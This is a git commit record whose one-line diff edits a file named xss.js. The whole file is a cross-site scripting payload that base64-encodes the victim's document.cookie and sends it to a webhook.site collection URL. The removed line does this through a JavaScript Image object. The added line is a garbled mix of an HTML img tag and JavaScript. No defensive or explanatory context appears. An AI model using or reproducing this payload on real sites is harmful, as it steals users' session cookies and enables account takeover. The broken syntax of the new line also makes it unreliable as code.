6afae457ee6d63a7ce5e0b9f7328c5d959cdc9f8
elchals <loreginopetit@hotmail.com>
2024-11-26 21:03:51 +0100

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,1 +1,1 @@
-x = new Image(); x.src = 'https://webhook.site/62fce723-0277-4dac-b683-f71462ff1bca?data='+btoa(document.cookie);
+<img src="https://webhook.site/62fce723-0277-4dac-b683-f71462ff1bca?data=" + btoa(document.cookie);>
